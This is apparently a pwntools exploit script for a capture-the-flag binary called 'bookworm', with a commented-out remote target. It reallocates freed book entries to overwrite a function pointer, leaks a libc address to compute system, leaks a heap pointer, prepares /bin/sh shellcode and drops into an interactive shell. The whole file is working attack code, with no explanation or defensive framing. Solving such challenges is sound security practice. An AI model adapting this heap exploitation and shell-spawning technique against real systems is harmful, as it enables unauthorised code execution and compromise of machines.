#!/usr/bin/python3

from pwn import *

target = './bookworm'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def insert_book(s1,name,s2,summary):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(s1)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('size:')
    p.sendline(s2)
    p.recvuntil('summary:')
    p.sendline(summary)

def delete_book(bookid):
    p.recvuntil('>>')
    p.sendline('2')
    p.sendline(bookid)

def write_sum(bookid,s1,summary):
    p.recvuntil('>>')
    p.sendline('3')
    p.sendline(bookid)
    p.sendline(s1)
    p.sendline(summary)

def call_fun(bookid):
    p.recvuntil('>>')
    p.sendline('4')
    p.sendline(bookid)

#==========================================================
#           CODE
#==========================================================

sc = asm(shellcraft.linux.sh())
distance = 0xffff

p = process(target, env={"LD_PRELOAD":"libc.so.6"})

#p = remote('cha.hackpack.club',41703)

gdb.attach(p)

first_pack = p64(0x400700) + p64(0x41414141) + p64(0x602020)

insert_book('23','bin/sh','23','CCCCCCCCDDDDDDDD')
delete_book('0')

insert_book('24','AAAABBBB', '23', 'GGGGGGGGHHHHHHHH')
delete_book('1')

write_sum('1','24',first_pack)
call_fun('0')

puts_leak = p.recvline()
puts_leak = puts_leak.split(b': ')[1].rstrip(b'\n')

sys_addr = int.from_bytes(puts_leak, byteorder='little') - 0x31580

second_pack = p64(0x400700) + p64(0x42424242) + p64(0x6020c0)

write_sum('1','24',second_pack)
call_fun('0')

ptr_leak = p.recvline()
ptr_leak = ptr_leak.split(b': ')[1].rstrip(b'\n')
ptr_leak = int(ptr_leak.hex(),16)


last_pack = p64(0x400700) + p64(0x43434343) + p64(ptr_leak)

write_sum('1','24',last_pack)

print(puts_leak)
print(ptr_leak)

p.interactive()

